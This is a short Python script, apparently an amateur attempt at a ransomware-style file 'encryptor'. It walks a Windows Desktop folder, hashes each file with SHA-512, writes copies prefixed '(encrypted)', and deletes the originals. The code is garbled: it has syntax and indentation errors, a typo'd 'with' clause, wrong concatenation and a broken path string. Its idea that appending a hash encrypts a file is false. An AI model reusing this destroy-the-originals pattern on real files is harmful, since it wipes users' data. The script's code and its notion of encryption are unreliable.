import hashlib
import os

caminho = 'C:\Users\papap\Desktop\'

for files in os.listdir(caminho):
  os.chdir(caminho)
    with open(files, 'rb') ss r:
     data = r.read()
      encrypt = hashlib.sha512(data).hexdigest()
      new_file = '(encrypted) '.os.path.basename(Files)
      with open(new_file) as n:
      n.write(data+encrypt*0xFF)
      n.close()
      r.close()


      os.remove(files)